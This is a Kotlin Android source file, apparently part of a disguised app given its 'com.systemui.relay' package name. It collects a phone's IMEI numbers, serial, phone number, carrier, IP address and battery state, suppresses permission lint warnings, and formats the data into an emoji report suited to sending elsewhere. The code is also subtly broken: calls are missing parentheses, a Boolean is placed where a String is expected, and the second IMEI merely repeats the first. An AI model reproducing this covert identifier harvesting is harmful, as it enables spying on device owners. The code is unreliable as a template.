package com.systemui.relay

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import java.net.Inet4Address
import java.net.NetworkInterface

object DeviceInfoCollector {

    @SuppressLint("MissingPermission", "HardwareIds")
    fun getDeviceInfo(ctx: Context): Map<String, String> {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        val model = "${Build.MANUFACTURER} ${Build.MODEL}"
        val android = "${Build.VERSION.RELEASE} (API ${Build.SDK_INT})"

        // IMEI 1 - version safe
        val imei1 = getImei1(tm)

        // IMEI 2 - version safe  
        val imei2 = getImei2(tm)

        // Serial - version safe
        val serial = getSerial()

        // Battery
        val battery = getBatteryLevel(bm, ctx)

        // Charging status
        val isCharging = isCharging(ctx)

        // IP Address
        val localIp = getLocalIp(wifi)

        // Carrier
        val carrier = getCarrier(tm)

        // Phone Number
        val phoneNumber = getPhoneNumber(tm)

        return mapOf(
            "model" to model,
            "android" to android,
            "imei1" to imei1,
            "imei2" to imei2,
            "serial" to serial,
            "battery" to battery,
            "isCharging" to isCharging,
            "localIp" to localIp,
            "carrier" to carrier,
            "phoneNumber" to phoneNumber
        )
    }

    private fun getImei1(tm: TelephonyManager): String {
        return try {
            when {
                Build.VERSION.SDK_INT >= 29 -> "Restricted"
                Build.VERSION.SDK_INT >= 26 -> tm.imei ?: "None"
                else -> tm.deviceId ?: "None"
            }
        } catch (e: SecurityException) { "Permission denied" }
        catch (e: Exception) { "Error" }
    }

    private fun getImei2(tm: TelephonyManager): String {
        return try {
            when {
                Build.VERSION.SDK_INT >= 29 -> "Restricted"
                Build.VERSION.SDK_INT >= 26 -> {
                    if (Build.VERSION.SDK_INT >= 21) {
                        try {
                            tm.imei ?: "None"
                        } catch (e: Exception) {
                            "Not supported"
                        }
                    } else {
                        "Not supported"
                    }
                }
                else -> "Not supported"
            }
        } catch (e: SecurityException) { "Permission denied" }
        catch (e: Exception) { "Error" }
    }

    private fun getSerial(): String {
        return try {
            when {
                Build.VERSION.SDK_INT >= 29 -> "Restricted"
                Build.VERSION.SDK_INT >= 26 -> Build.getSerial() ?: "None"
                else -> Build.SERIAL ?: "None"
            }
        } catch (e: SecurityException) { "Permission denied" }
        catch (e: Exception) { "Error" }
    }

    private fun getBatteryLevel(bm: BatteryManager, ctx: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).toString()
            } else {
                val intent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                if (level >= 0 && scale > 0) {
                    (level * 100 / scale).toString()
                } else {
                    "Unknown"
                }
            }
        } catch (e: Exception) { "Unknown" }
    }

    private fun isCharging(ctx: Context): Boolean {
        return try {
            val intent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        } catch (e: Exception) { false }
    }

    private fun getLocalIp(wifi: WifiManager): String {
        return try {
            val ipInt = wifi.connectionInfo.ipAddress
            if (ipInt != 0) {
                String.format(
                    "%d.%d.%d.%d",
                    ipInt and 0xff,
                    ipInt shr 8 and 0xff,
                    ipInt shr 16 and 0xff,
                    ipInt shr 24 and 0xff
                )
            } else {
                getLocalIpAddress() ?: "None"
            }
        } catch (e: Exception) { "None" }
    }

    private fun getLocalIpAddress(): String? {
        return try {
            NetworkInterface.getNetworkInterfaces()?.toList()?.flatMap { it.inetAddresses.toList() }?.firstOrNull {
                !it.isLoopbackAddress && it is Inet4Address
            }?.hostAddress
        } catch (e: Exception) { null }
    }

    private fun getCarrier(tm: TelephonyManager): String {
        return try {
            tm.networkOperatorName?.ifEmpty { "None" } ?: "None"
        } catch (e: Exception) { "None" }
    }

    @SuppressLint("MissingPermission")
    private fun getPhoneNumber(tm: TelephonyManager): String {
        return try {
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> {
                    tm.line1Number?.ifEmpty { "None" } ?: "None"
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> {
                    tm.line1Number?.ifEmpty { "None" } ?: "None"
                }
                else -> {
                    try {
                        tm.line1Number?.ifEmpty { "None" } ?: "None"
                    } catch (e: SecurityException) { "Permission denied" }
                }
            }
        } catch (e: SecurityException) { "Permission denied" }
        catch (e: Exception) { "Error" }
    }

    fun formatDeviceInfo(map: Map<String, String>): String {
        val charging = if (map["isCharging"] == "true") "Charging" else "Not charging"
        
        return buildString {
            appendLine("📱 DEVICE INFO")
            appendLine("━━━━━━━━━━━━━━━━━━━")
            appendLine("Model:    ${map["model"]}")
            appendLine("Android:  ${map["android"]}")
            appendLine("IMEI 1:   ${map["imei1"]}")
            appendLine("IMEI 2:   ${map["imei2"]}")
            appendLine("Serial:   ${map["serial"]}")
            appendLine("Battery:  ${map["battery"]}% ($charging)")
            appendLine()
            appendLine("🌐 NETWORK")
            appendLine("IP:       ${map["localIp"]}")
            appendLine("Carrier:  ${map["carrier"]}")
            appendLine("Number:   ${map["phoneNumber"]}")
        }
    }
}